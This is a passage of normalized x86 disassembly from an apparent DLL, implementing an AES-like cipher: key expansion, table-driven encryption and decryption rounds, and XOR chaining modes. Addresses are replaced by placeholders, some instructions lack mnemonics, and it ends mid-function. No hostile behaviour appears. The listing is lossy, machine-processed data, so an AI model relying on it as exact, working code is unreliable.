jbe r-xdata
mov ecx esi
sub ebx edi
mov eax edi
sub ecx edi
mov [ esp + 0x24 ] 0x10
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x34 ]
mov edx [ esp + 0x34 ]
mov eax esi
mov ecx edx
mov edi ebp
sub ecx esi
mov eax edi
mov ecx [ eax ]
mov [ esp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x14 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
mov edx [ eax + 0xc ]
mov eax [ esp + 0x30 ]
push eax
push esi
push edi
mov [ esp + 0x28 ] edx
call sub_10042290
mov ecx [ esp + 0x40 ]
add esp 0xc
mov eax esi
sub ecx esi
mov edx 0x10
mov ecx [ esp + 0x34 ]
mov ebx edi
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x10 ]
sub ebx edx
sub esi eax
mov ecx [ esp + 0x30 ]
push ecx
push esi
push edi
call sub_10042290
add esp 0xc
mov eax esi
sub ebx esi
mov ecx 0x10
mov ecx [ esp + 0x34 ]
cmp ebp 0x10
jae r-xdata
mov eax ebx
mov ecx esi
sub eax edi
sub ecx edi
mov [ esp + 0x24 ] ebp
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ edx ] ecx
mov ecx [ esp + 0x18 ]
mov [ edx + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] eax
mov ecx 0x10
lea edi [ esi + ebp ]
sub ecx ebp
lea esi [ esp + ebp + 0x10 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov bl [ eax + ecx ]
xor [ eax ] bl
inc eax
dec edi
jne r-xdata
jmp r-xdata
lea eax [ esp + ecx + 0x10 ]
mov dl [ ebx + eax ]
xor dl [ eax ]
inc ecx
cmp ecx ebp
mov [ esi + eax ] dl
jb r-xdata
mov eax [ esp + 0x30 ]
push eax
push esi
push esi
call sub_10041ce0
mov ecx [ esp + 0x40 ]
add esp 0xc
mov ebx esi
mov edi ebx
mov eax 0x10
sub edi esi
lea ecx [ esi + ebp ]
sub eax ebp
mov dl [ edi + eax ]
xor dl [ edi ]
inc edi
mov [ edi + ecx - 0x1 ] dl
mov edx [ esp + 0x24 ]
dec edx
mov [ esp + 0x24 ] edx
jne r-xdata
cmp ebp 0x10
jae r-xdata
mov dl [ edi + ecx ]
mov [ ecx ] dl
inc ecx
dec eax
jne r-xdata
sub_100412f0
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
push ebx
push ebp
push esi
mov esi [ ecx ]
test eax eax
mov eax [ esp + 0x18 ]
push edi
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ ecx ] esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov al [ ebp ]
mov dl [ esi + edi ]
xor dl al
mov [ ebx ] dl
inc ebx
inc ebp
mov [ esi + edi ] al
mov eax [ esp + 0x1c ]
inc esi
and esi 0xf
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push edi
push edi
call sub_10041ce0
mov ecx [ esp + 0x34 ]
add esp 0xc
mov al [ ebp ]
mov dl [ esi + edi ]
xor al dl
mov [ ebx ] al
inc ebx
mov [ esi + edi ] al
mov eax [ esp + 0x1c ]
inc ebp
inc esi
and esi 0xf
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
push eax
push edi
push edi
call sub_10041ce0
mov ecx [ esp + 0x34 ]
add esp 0xc
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov [ ecx ] esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100413b0
mov eax 0x20
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x30 ]
push ebp
push esi
test ebx ebx
push edi
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
cmp ebx 0x80
jg r-xdata
mov edi [ esp + 0x44 ]
mov eax edi
mov ecx [ eax ]
mov [ esp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x14 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
mov edx [ eax + 0xc ]
mov eax [ esp + 0x40 ]
push eax
push edi
push edi
mov [ esp + 0x28 ] edx
call sub_10041ce0
lea eax [ ebx + 0x7 ]
add esp 0xc
cdq
and edx 0x7
add eax edx
mov ebp eax
mov eax [ esp + 0x48 ]
sar ebp 0x3
test eax eax
je r-xdata
xor esi esi
test ebp ebp
jle r-xdata
test ebp ebp
jle r-xdata
mov ebp ebx
and ebp 0x80000007
jns r-xdata
mov eax [ esp + 0x34 ]
lea ecx [ esp + 0x20 ]
mov ebx edi
lea edx [ esp + 0x20 ]
sub eax ecx
mov ecx [ esp + 0x38 ]
sub ebx edx
lea edx [ esp + 0x20 ]
sub ecx edx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ecx
jmp r-xdata
mov edx [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
lea esi [ esp + 0x20 ]
sub edx edi
sub esi edi
mov ecx edi
sub ebx edi
mov eax ebx
cdq
and edx 0x7
add eax edx
sar eax 0x3
test ebp ebp
jne r-xdata
dec ebp
or ebp 0xfffffff8
inc ebp
lea ecx [ esp + esi + 0x20 ]
mov dl [ eax + ecx ]
mov bl [ ebx + ecx ]
mov [ ecx ] dl
xor bl dl
mov edx [ esp + 0x38 ]
inc esi
cmp esi ebp
mov [ edx + ecx ] bl
jl r-xdata
mov al [ edx + ecx ]
xor al [ ecx ]
inc ecx
dec ebp
mov [ esi + ecx - 0x1 ] al
mov [ ebx + ecx - 0x1 ] al
jne r-xdata
jmp r-xdata
mov ecx 0x8
xor esi esi
sub ecx ebp
lea eax [ esp + eax + 0x10 ]
mov [ esp + 0x3c ] ecx
jmp r-xdata
lea eax [ esp + eax + 0x10 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov ecx [ eax + 0x8 ]
mov [ edi + 0x8 ] ecx
mov edx [ eax + 0xc ]
mov [ edi + 0xc ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov ebx [ esp + 0x34 ]
mov ebx [ esp + 0x3c ]
mov dl [ eax + esi + 0x1 ]
mov bl [ eax + esi ]
shr dl cl
mov ecx ebp
shl bl cl
or dl bl
mov [ esi + edi ] dl
inc esi
cmp esi 0x10
jl r-xdata
mov ecx [ esp + 0x3c ]
sub_10041510
mov eax 0x4
call sub_1001d0d0
mov edx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x14 ]
lea ecx [ edx + 0x7 ]
xor eax eax
shr ecx 0x3
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
xor edi edi
test edx edx
jbe r-xdata
pop edi
pop esi
pop ecx
retn
push ebx
push ebp
mov eax [ esp + 0x18 ]
mov ebx edi
mov esi edi
and ebx 0x7
mov ebp 0x7
shr esi 0x3
sub ebp ebx
mov dl [ esi + eax ]
mov eax 0x1
mov ecx ebp
shl eax cl
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x17 ]
and dl al
mov eax [ esp + 0x28 ]
neg dl
sbb dl dl
and edx 0x80
mov [ esp + 0x16 ] dl
mov edx [ esp + 0x2c ]
push edx
push eax
push 0x1
lea edx [ esp + 0x22 ]
push ecx
push edx
call sub_100413b0
mov al 0x1
mov ecx ebp
mov ebp [ esp + 0x34 ]
add esp 0x18
shl al cl
mov dl [ esi + ebp ]
mov cl bl
not al
and al dl
mov dl [ esp + 0x13 ]
and dl 0x80
shr dl cl
or al dl
inc edi
mov [ esi + ebp ] al
mov eax [ esp + 0x20 ]
cmp edi eax
jb r-xdata
pop ebp
pop ebx
sub_100415d0
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
jbe r-xdata
pop ebx
retn
push ebp
mov ebp [ esp + 0x24 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
sub edi esi
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push ebp
push eax
push ecx
lea edx [ edi + esi ]
push 0x8
push edx
push esi
call sub_100413b0
add esp 0x18
inc esi
dec ebx
jne r-xdata
pop edi
pop esi
pop ebp
sub_10041610
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
cmp eax 0x1
mov eax [ esp + 0xc ]
push eax
push ecx
push edx
jne r-xdata
call sub_10042290
add esp 0xc
retn
call sub_10041ce0
add esp 0xc
retn
sub_10041640
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
push esi
mov esi [ ecx ]
test eax eax
je r-xdata
mov [ ecx ] esi
pop esi
retn
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x20 ]
push edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
mov dl [ esi + ebp ]
mov al [ ebx ]
xor dl al
mov eax [ esp + 0x1c ]
mov [ edi ] dl
inc edi
inc ebx
inc esi
and esi 0xf
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x20 ]
push eax
push ebp
push ebp
call sub_10041ce0
mov ecx [ esp + 0x34 ]
add esp 0xc
test esi esi
jne r-xdata
pop edi
pop ebp
mov [ ecx ] esi
pop ebx
pop esi
retn
sub_100416a0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
test esi esi
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
mov edx [ esp + 0x18 ]
test edx edx
je r-xdata
mov ebx [ esp + 0x14 ]
cmp ebx 0x80
je r-xdata
mov [ edx + 0xf0 ] 0xa
jmp r-xdata
cmp ebx 0xc0
je r-xdata
mov eax [ esi ]
mov ecx eax
ror ecx 0x8
and ecx 0xff00ff00
rol eax 0x8
and eax 0xff00ff
or ecx eax
mov [ edx ] ecx
mov edi [ esi + 0x4 ]
mov eax edi
lea ecx [ edx + 0x4 ]
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
mov [ ecx ] eax
mov edi [ esi + 0x8 ]
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
mov [ edx + 0x8 ] eax
mov edi [ esi + 0xc ]
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
cmp ebx 0x80
mov [ edx + 0xc ] eax
jne r-xdata
cmp ebx 0x80
jne r-xdata
cmp ebx 0x100
je r-xdata
mov edi [ esi + 0x10 ]
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
mov [ edx + 0x10 ] eax
mov edi [ esi + 0x14 ]
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
cmp ebx 0xc0
mov [ edx + 0x14 ] eax
jne r-xdata
mov edi r--data
cmp ebx 0xc0
jne r-xdata
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
retn
mov edi [ esi + 0x18 ]
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
mov [ edx + 0x18 ] eax
mov esi [ esi + 0x1c ]
mov eax esi
ror eax 0x8
and eax 0xff00ff00
rol esi 0x8
and esi 0xff00ff
or eax esi
cmp ebx 0x100
mov [ edx + 0x1c ] eax
jne r-xdata
mov esi r--data
pop edi
pop esi
xor eax eax
pop ebx
retn
add ecx 0x10
jmp r-xdata
mov [ edx + 0xf0 ] 0xe
mov [ edx + 0xf0 ] 0xc
jmp r-xdata
mov eax ecx
mov edi r--data
mov eax [ ecx + 0xc ]
mov ebx edx
mov edx [ ecx + 0x10 ]
xor eax ebx
xor edx eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x28 ] edx
add ecx 0x18
jmp r-xdata
mov esi [ ecx + 0x8 ]
xor eax eax
mov edx esi
xor ebx ebx
mov [ esp + 0x10 ] edx
mov al dh
mov bl [ esp + 0x12 ]
add edi 0x4
mov eax [ eax * 4 + r--data ]
mov ebx [ ebx * 4 + r--data ]
and eax 0xff0000
and ebx 0xff000000
xor eax ebx
mov ebx edx
shr ebx 0x18
and edx 0xff
mov ebx [ ebx * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
and ebx 0xff
xor eax ebx
mov ebx [ edi - 0x4 ]
and edx 0xff00
xor eax edx
mov edx [ ecx - 0x4 ]
xor eax edx
mov edx [ ecx ]
xor eax ebx
mov [ ecx + 0xc ] eax
xor eax edx
mov edx [ ecx + 0x4 ]
mov [ ecx + 0x10 ] eax
xor edx eax
mov [ ecx + 0x14 ] edx
xor edx esi
cmp edi r--data
mov [ ecx + 0x18 ] edx
je r-xdata
mov ecx edx
xor edx edx
mov [ esp + 0x10 ] ecx
mov dl [ esp + 0x12 ]
mov esi [ edx * 4 + r--data ]
xor edx edx
mov dl ch
and esi 0xff0000
mov edx [ edx * 4 + r--data ]
and edx 0xff00
xor esi edx
mov edx ecx
shr edx 0x18
and ecx 0xff
mov edx [ edx * 4 + r--data ]
mov ecx [ ecx * 4 + r--data ]
and edx 0xff000000
xor esi edx
mov edx [ eax + 0x10 ]
and ecx 0xff
xor esi ecx
mov ecx [ eax + 0xc ]
xor esi ecx
mov ecx [ eax + 0x14 ]
xor edx esi
mov [ eax + 0x2c ] esi
mov [ eax + 0x30 ] edx
xor ecx edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x34 ] ecx
xor ecx edx
mov [ eax + 0x38 ] ecx
add eax 0x20
jmp r-xdata
mov edx [ ecx + 0x10 ]
xor eax eax
mov [ esp + 0x10 ] edx
xor ebx ebx
mov bl [ esp + 0x12 ]
mov al dh
add esi 0x4
mov eax [ eax * 4 + r--data ]
mov edi [ ebx * 4 + r--data ]
and eax 0xff0000
and edi 0xff000000
xor eax edi
mov edi edx
shr edi 0x18
and edx 0xff
mov ebx [ esi - 0x4 ]
mov edi [ edi * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
and edi 0xff
xor eax edi
and edx 0xff00
xor eax edx
mov edx [ ecx - 0x4 ]
xor eax edx
mov edx [ ecx ]
xor eax ebx
mov [ ecx + 0x14 ] eax
xor edx eax
mov eax [ ecx + 0x4 ]
mov [ ecx + 0x18 ] edx
xor eax edx
mov edx [ ecx + 0x8 ]
xor edx eax
cmp esi r--data
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] edx
je r-xdata
mov edx [ eax + 0x18 ]
xor ecx ecx
mov [ esp + 0x10 ] edx
xor ebx ebx
mov bl [ esp + 0x12 ]
mov cl dh
add edi 0x4
mov ecx [ ecx * 4 + r--data ]
mov esi [ ebx * 4 + r--data ]
and ecx 0xff0000
and esi 0xff000000
xor ecx esi
mov esi edx
shr esi 0x18
and edx 0xff
mov ebx [ edi - 0x4 ]
mov esi [ esi * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
and esi 0xff
xor ecx esi
and edx 0xff00
xor ecx edx
mov edx [ eax - 0x4 ]
xor ecx edx
mov edx [ eax ]
xor ecx ebx
mov [ eax + 0x1c ] ecx
xor edx ecx
mov ecx [ eax + 0x4 ]
mov [ eax + 0x20 ] edx
xor ecx edx
mov edx [ eax + 0x8 ]
xor edx ecx
cmp edi r--data
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] edx
je r-xdata
sub_10041a60
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push ebp
push eax
push ecx
call sub_100416a0
add esp 0xc
test eax eax
jl r-xdata
pop ebp
retn
mov edx [ ebp + 0xf0 ]
push ebx
push esi
xor esi esi
shl edx 0x2
test edx edx
push edi
jle r-xdata
mov eax [ ebp + 0xf0 ]
mov esi 0x1
cmp eax esi
jle r-xdata
lea ecx [ ebp + edx * 4 + 0x8 ]
lea eax [ ebp + 0x8 ]
pop edi
pop esi
xor eax eax
pop ebx
lea eax [ ebp + 0x8 ]
mov ebx [ ecx - 0x8 ]
mov edi [ eax - 0x8 ]
mov [ eax - 0x8 ] ebx
mov [ ecx - 0x8 ] edi
mov ebx [ ecx - 0x4 ]
mov edi [ eax - 0x4 ]
mov [ eax - 0x4 ] ebx
mov [ ecx - 0x4 ] edi
mov ebx [ ecx ]
mov edi [ eax ]
mov [ eax ] ebx
mov [ ecx ] edi
mov ebx [ ecx + 0x4 ]
mov edi [ eax + 0x4 ]
mov [ eax + 0x4 ] ebx
mov [ ecx + 0x4 ] edi
add esi 0x4
sub edx 0x4
add eax 0x10
sub ecx 0x10
cmp esi edx
jl r-xdata
mov ecx [ eax + 0x8 ]
add eax 0x10
xor ebx ebx
mov [ esp + 0x1c ] ecx
mov bl ch
xor edx edx
mov dl [ esp + 0x1e ]
mov edi [ ebx * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
and edi 0xff
and edx 0xff
mov ebx [ edi * 4 + r--data ]
mov edi ecx
mov edx [ edx * 4 + r--data ]
and ecx 0xff
shr edi 0x18
mov ecx [ ecx * 4 + r--data ]
xor edx ebx
mov edi [ edi * 4 + r--data ]
and ecx 0xff
and edi 0xff
mov ebx [ edi * 4 + r--data ]
xor edx ebx
mov ebx [ ecx * 4 + r--data ]
mov ecx [ eax - 0x4 ]
xor edx ebx
xor ebx ebx
mov [ eax - 0x8 ] edx
mov bl ch
mov [ esp + 0x1c ] ecx
xor edx edx
mov edi [ ebx * 4 + r--data ]
mov dl [ esp + 0x1e ]
and edi 0xff
mov edx [ edx * 4 + r--data ]
mov ebx [ edi * 4 + r--data ]
mov edi ecx
shr edi 0x18
and edx 0xff
and ecx 0xff
mov edi [ edi * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
mov ecx [ ecx * 4 + r--data ]
and edi 0xff
xor edx ebx
and ecx 0xff
mov ebx [ edi * 4 + r--data ]
xor edx ebx
mov ebx [ ecx * 4 + r--data ]
mov ecx [ eax ]
xor edx ebx
xor ebx ebx
mov [ eax - 0x4 ] edx
mov bl ch
mov [ esp + 0x1c ] ecx
xor edx edx
mov edi [ ebx * 4 + r--data ]
mov dl [ esp + 0x1e ]
and edi 0xff
mov edx [ edx * 4 + r--data ]
mov ebx [ edi * 4 + r--data ]
mov edi ecx
shr edi 0x18
and edx 0xff
and ecx 0xff
mov edi [ edi * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
mov ecx [ ecx * 4 + r--data ]
and edi 0xff
xor edx ebx
and ecx 0xff
mov ebx [ edi * 4 + r--data ]
xor edx ebx
mov ebx [ ecx * 4 + r--data ]
mov ecx [ eax + 0x4 ]
xor edx ebx
mov [ eax ] edx
mov [ esp + 0x1c ] ecx
xor edx edx
mov dl [ esp + 0x1e ]
mov edx [ edx * 4 + r--data ]
xor ebx ebx
and edx 0xff
mov bl ch
mov edx [ edx * 4 + r--data ]
mov edi [ ebx * 4 + r--data ]
and edi 0xff
mov ebx [ edi * 4 + r--data ]
mov edi ecx
shr edi 0x18
and ecx 0xff
xor edx ebx
mov edi [ edi * 4 + r--data ]
mov ecx [ ecx * 4 + r--data ]
and edi 0xff
and ecx 0xff
mov ebx [ edi * 4 + r--data ]
mov edi [ ecx * 4 + r--data ]
xor edx ebx
xor edx edi
inc esi
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0xf0 ]
cmp esi ecx
jl r-xdata
sub_10041ce0
mov eax 0x10
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push esi
mov eax [ ebx ]
push edi
mov edi [ esp + 0x2c ]
mov ecx eax
ror ecx 0x8
mov esi [ edi ]
and ecx 0xff00ff00
rol eax 0x8
and eax 0xff00ff
or ecx eax
mov eax [ ebx + 0x4 ]
xor ecx esi
mov esi eax
ror esi 0x8
and esi 0xff00ff00
mov [ esp + 0x1c ] ecx
rol eax 0x8
and eax 0xff00ff
or esi eax
mov eax [ edi + 0x4 ]
xor esi eax
mov eax [ ebx + 0x8 ]
mov edx eax
mov ebx [ ebx + 0xc ]
ror edx 0x8
and edx 0xff00ff00
mov [ esp + 0x2c ] esi
rol eax 0x8
and eax 0xff00ff
or edx eax
mov eax [ edi + 0x8 ]
xor edx eax
mov eax ebx
ror eax 0x8
and eax 0xff00ff00
mov [ esp + 0x10 ] edx
rol ebx 0x8
and ebx 0xff00ff
or eax ebx
mov ebx [ edi + 0xc ]
xor eax ebx
xor ebx ebx
mov bl dh
mov [ esp + 0x14 ] eax
shr esi 0x18
mov edx [ ebx * 4 + r--data ]
xor ebx ebx
mov bl [ esp + 0x2e ]
mov ebp [ ebx * 4 + r--data ]
mov ebx ecx
shr ebx 0x18
xor edx ebp
mov ebp [ ebx * 4 + r--data ]
mov ebx eax
and ebx 0xff
xor edx ebp
mov ebp [ ebx * 4 + r--data ]
xor ebx ebx
mov bl ah
xor edx ebp
mov ebp [ edi + 0x10 ]
xor eax eax
mov al [ esp + 0x12 ]
xor edx ebp
mov ebp [ ebx * 4 + r--data ]
mov [ esp + 0x18 ] edx
mov ebx [ eax * 4 + r--data ]
mov eax ecx
xor ebp ebx
mov ebx [ esi * 4 + r--data ]
mov esi [ edi + 0x14 ]
and eax 0xff
xor ebp ebx
xor ebp [ eax * 4 + r--data ]
xor eax eax
xor ebx ebx
mov al [ esp + 0x16 ]
mov bl ch
xor ebp esi
mov eax [ eax * 4 + r--data ]
mov ecx [ ebx * 4 + r--data ]
xor eax ecx
mov ecx [ esp + 0x10 ]
shr ecx 0x18
mov [ esp + 0x24 ] ebp
mov esi [ ecx * 4 + r--data ]
mov ecx [ esp + 0x2c ]
xor eax esi
mov esi ecx
and esi 0xff
mov ebx [ esi * 4 + r--data ]
xor eax ebx
mov ebx [ edi + 0x18 ]
xor eax ebx
xor ebx ebx
mov bl ch
mov [ esp + 0x2c ] eax
mov ecx [ ebx * 4 + r--data ]
xor ebx ebx
mov bl [ esp + 0x1e ]
mov esi [ ebx * 4 + r--data ]
xor ecx esi
mov esi [ esp + 0x14 ]
shr esi 0x18
mov ebx [ esi * 4 + r--data ]
mov esi [ esp + 0x10 ]
and esi 0xff
xor ecx ebx
mov ebx [ esi * 4 + r--data ]
mov esi [ edi + 0x1c ]
xor ecx ebx
xor ecx esi
lea esi [ edi + 0x20 ]
mov edi [ edi + 0xf0 ]
mov [ esp + 0x14 ] ecx
sar edi 0x1
dec edi
je r-xdata
xor ebx ebx
mov bl [ esp + 0x26 ]
shr ebp 0x18
mov edi [ ebx * 4 + r--data ]
xor ebx ebx
mov bl ah
and edi 0xff0000
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff00
xor edi ebx
mov ebx edx
shr ebx 0x18
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff000000
xor edi ebx
mov ebx ecx
and ebx 0xff
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff
xor edi ebx
mov ebx [ esi ]
xor edi ebx
mov ebx edi
ror ebx 0x8
and ebx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ebx edi
mov edi [ esp + 0x28 ]
mov [ edi ] ebx
xor ebx ebx
mov bl [ esp + 0x2e ]
mov edi [ ebx * 4 + r--data ]
xor ebx ebx
mov bl ch
and edi 0xff0000
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff00
xor edi ebx
mov ebx [ ebp * 4 + r--data ]
and ebx 0xff000000
mov ebp [ esp + 0x28 ]
xor edi ebx
mov ebx edx
and ebx 0xff
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff
xor edi ebx
mov ebx [ esi + 0x4 ]
xor edi ebx
mov ebx edi
ror ebx 0x8
and ebx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ebx edi
mov [ ebp + 0x4 ] ebx
xor ebx ebx
mov bl [ esp + 0x16 ]
mov edi [ ebx * 4 + r--data ]
xor ebx ebx
mov bl dh
and edi 0xff0000
mov edx [ ebx * 4 + r--data ]
and edx 0xff00
xor edi edx
mov edx eax
shr edx 0x18
mov edx [ edx * 4 + r--data ]
and edx 0xff000000
xor edi edx
mov edx [ esp + 0x24 ]
mov ebx edx
and ebx 0xff
mov ebx [ ebx * 4 + r--data ]
and ebx 0xff
xor edi ebx
mov ebx [ esi + 0x8 ]
xor edi ebx
mov ebx edi
ror ebx 0x8
and ebx 0xff00ff00
and eax 0xff
rol edi 0x8
and edi 0xff00ff
or ebx edi
mov [ ebp + 0x8 ] ebx
xor ebx ebx
mov bl [ esp + 0x1a ]
shr ecx 0x18
mov edi [ ebx * 4 + r--data ]
xor ebx ebx
mov ecx [ ecx * 4 + r--data ]
mov bl dh
and edi 0xff0000
and ecx 0xff000000
mov edx [ ebx * 4 + r--data ]
and edx 0xff00
xor edi edx
mov edx [ eax * 4 + r--data ]
xor edi ecx
and edx 0xff
xor edi edx
mov edx [ esi + 0xc ]
xor edi edx
mov eax edi
ror eax 0x8
and eax 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or eax edi
pop edi
mov [ ebp + 0xc ] eax
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebp edi
xor edx edx
xor ebx ebx
mov bl [ esp + 0x26 ]
mov dl ah
mov edi [ edx * 4 + r--data ]
mov edx [ ebx * 4 + r--data ]
xor edi edx
mov edx [ esp + 0x18 ]
mov ebx edx
shr ebx 0x18
xor edi [ ebx * 4 + r--data ]
mov ebx ecx
and ebx 0xff
xor edi [ ebx * 4 + r--data ]
mov ebx [ esi ]
xor edi ebx
xor ebx ebx
mov bl ch
mov [ esp + 0x1c ] edi
mov ecx [ ebx * 4 + r--data ]
xor ebx ebx
mov bl [ esp + 0x2e ]
mov edi [ ebx * 4 + r--data ]
xor ecx edi
mov edi [ esp + 0x24 ]
shr edi 0x18
mov ebx [ edi * 4 + r--data ]
mov edi edx
and edi 0xff
xor ecx ebx
mov ebx [ edi * 4 + r--data ]
mov edi [ esi + 0x4 ]
xor ecx ebx
xor ebx ebx
xor ecx edi
mov bl dh
mov [ esp + 0x2c ] ecx
xor ecx ecx
mov cl [ esp + 0x16 ]
mov edx [ ebx * 4 + r--data ]
mov ecx [ ecx * 4 + r--data ]
xor ecx edx
mov edx eax
shr edx 0x18
and eax 0xff
mov edi [ edx * 4 + r--data ]
mov edx [ esp + 0x24 ]
xor ecx edi
mov edi edx
and edi 0xff
mov ebx [ edi * 4 + r--data ]
xor ecx ebx
mov ebx [ esi + 0x8 ]
xor ecx ebx
xor ebx ebx
mov bl dh
mov [ esp + 0x10 ] ecx
mov edx [ ebx * 4 + r--data ]
xor ebx ebx
mov bl [ esp + 0x1a ]
mov edi [ ebx * 4 + r--data ]
xor edx edi
mov edi [ esp + 0x14 ]
shr edi 0x18
mov ebx [ edi * 4 + r--data ]
mov edi [ esi + 0xc ]
xor edx ebx
mov ebx [ eax * 4 + r--data ]
xor edx ebx
xor eax eax
xor ebx ebx
mov al ch
mov bl [ esp + 0x2e ]
xor edx edi
mov edi [ eax * 4 + r--data ]
mov [ esp + 0x14 ] edx
mov eax [ ebx * 4 + r--data ]
xor edi eax
mov eax [ esp + 0x1c ]
mov ebx eax
shr ebx 0x18
xor edi [ ebx * 4 + r--data ]
mov ebx edx
and ebx 0xff
add esi 0x20
xor edi [ ebx * 4 + r--data ]
mov ebx [ esi - 0x10 ]
xor edi ebx
xor ebx ebx
mov bl dh
xor edx edx
mov dl [ esp + 0x12 ]
mov [ esp + 0x18 ] edi
mov edi [ ebx * 4 + r--data ]
mov ebx [ edx * 4 + r--data ]
mov edx [ esp + 0x2c ]
shr edx 0x18
xor edi ebx
mov ebx [ edx * 4 + r--data ]
mov edx eax
and edx 0xff
xor edi ebx
mov ebx [ edx * 4 + r--data ]
xor edx edx
mov dl [ esp + 0x16 ]
xor edi ebx
mov ebx [ esi - 0xc ]
xor edi ebx
xor ebx ebx
mov bl ah
mov eax [ edx * 4 + r--data ]
mov [ esp + 0x24 ] edi
mov edx [ ebx * 4 + r--data ]
xor eax edx
mov edx ecx
shr edx 0x18
and ecx 0xff
mov edi [ edx * 4 + r--data ]
mov edx [ esp + 0x2c ]
xor eax edi
mov edi edx
and edi 0xff
mov ebx [ edi * 4 + r--data ]
mov edi [ esi - 0x8 ]
xor eax ebx
xor ebx ebx
mov bl dh
xor edx edx
mov dl [ esp + 0x1e ]
xor eax edi
mov edi [ ebx * 4 + r--data ]
mov [ esp + 0x2c ] eax
mov ebx [ edx * 4 + r--data ]
mov edx [ esp + 0x14 ]
shr edx 0x18
xor edi ebx
mov ebx [ edx * 4 + r--data ]
mov edx [ ecx * 4 + r--data ]
xor edi ebx
mov ebx [ esi - 0x4 ]
xor edi edx
xor edi ebx
dec ebp
mov ecx edi
mov [ esp + 0x14 ] ecx
jne r-xdata
mov edx [ esp + 0x18 ]
mov ebp [ esp + 0x24 ]
sub_10042290
mov eax 0x14
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x1c ]
push ebp
push esi
mov eax [ ebx ]
push edi
mov edi [ esp + 0x30 ]
mov ecx eax
ror ecx 0x8
mov esi [ edi ]
and ecx 0xff00ff00
rol eax 0x8
and eax 0xff00ff
mov edx [ ebx + 0x8 ]
or ecx eax
mov eax [ ebx + 0x4 ]
xor ecx esi
mov esi eax
ror esi 0x8
and esi 0xff00ff00
mov ebx [ ebx + 0xc ]
rol eax 0x8
and eax 0xff00ff
